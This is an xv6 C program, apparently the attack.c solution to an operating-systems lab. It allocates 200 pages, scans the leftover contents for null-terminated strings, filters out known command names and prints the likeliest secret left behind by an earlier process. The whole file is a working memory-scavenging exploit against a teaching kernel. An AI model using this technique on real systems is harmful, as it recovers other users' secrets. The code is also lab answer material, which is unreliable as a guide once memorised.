#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

int main(int argc, char *argv[]) {
    // Allocate a very large chunk to get pages from previous processes
    char *mem = sbrk(200 * 4096);  // 200 pages (800KB)
    if (mem == (char*)-1) {
        exit(1);
    }
    
    int size = 200 * 4096;
    
    // Collect all candidate strings
    #define MAX_CAND 50
    struct {
        int pos;
        int len;
    } candidates[MAX_CAND];
    int num_cand = 0;
    
    // Known program/command names to skip
    char *skip_list[] = {"attack", "secret", "fork", "exit", "wait", "pipe", 
                         "read", "write", "close", "kill", "exec", "open", 
                         "mknod", "unlink", "link", "mkdir", "chdir", "dup",
                         "getpid", "sbrk", "sleep", "uptime", "sh", "init",
                         "ls", "cat", "echo", "grep", "rm", "wc", "zombie",
                         "usertests", "forktest", "stressfs", "XO", "N", 0};
    
    // Search through memory for candidate strings
    for (int i = 0; i < size - 100; i++) {
        char c = mem[i];
        
        // Start of potential alphanumeric string?
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')) {
            int len = 0;
            while (i + len < size && len < 100) {
                char ch = mem[i + len];
                if ((ch >= 'a' && ch <= 'z') || (ch >= 'A' && ch <= 'Z') || (ch >= '0' && ch <= '9')) {
                    len++;
                } else {
                    break;
                }
            }
            
            // Valid null-terminated string of reasonable length?
            if (len >= 2 && len <= 50 && i + len < size && mem[i + len] == '\0') {
                // Check against skip list
                int should_skip = 0;
                for (int s = 0; skip_list[s] != 0; s++) {
                    char *skip_word = skip_list[s];
                    int skip_len = 0;
                    while (skip_word[skip_len] != '\0') skip_len++;
                    
                    if (len == skip_len) {
                        int match = 1;
                        for (int k = 0; k < len; k++) {
                            if (mem[i + k] != skip_word[k]) {
                                match = 0;
                                break;
                            }
                        }
                        if (match) {
                            should_skip = 1;
                            break;
                        }
                    }
                }
                
                if (!should_skip) {
                    // Store this candidate
                    if (num_cand < MAX_CAND) {
                        candidates[num_cand].pos = i;
                        candidates[num_cand].len = len;
                        num_cand++;
                    }
                }
            }
            
            i += len;
        }
    }
    
    // Pick the best candidate - prefer strings with mixed case/numbers
    // (user secrets are more likely to have variety than system strings)
    int best = -1;
    int best_score = -1;
    
    for (int c = 0; c < num_cand; c++) {
        int pos = candidates[c].pos;
        int len = candidates[c].len;
        
        // Score based on character variety
        int has_lower = 0, has_upper = 0, has_digit = 0;
        for (int k = 0; k < len; k++) {
            char ch = mem[pos + k];
            if (ch >= 'a' && ch <= 'z') has_lower = 1;
            if (ch >= 'A' && ch <= 'Z') has_upper = 1;
            if (ch >= '0' && ch <= '9') has_digit = 1;
        }
        
        int variety = has_lower + has_upper + has_digit;
        int score = variety * 100 + len;  // Prefer variety, then length
        
        if (score > best_score) {
            best_score = score;
            best = c;
        }
    }
    
    // Print the best candidate, or first one if scoring didn't help
    if (best >= 0) {
        int pos = candidates[best].pos;
        int len = candidates[best].len;
        for (int j = 0; j < len; j++) {
            printf("%c", mem[pos + j]);
        }
        printf("\n");
    } else if (num_cand > 0) {
        int pos = candidates[0].pos;
        int len = candidates[0].len;
        for (int j = 0; j < len; j++) {
            printf("%c", mem[pos + j]);
        }
        printf("\n");
    }
    
    exit(0);
}
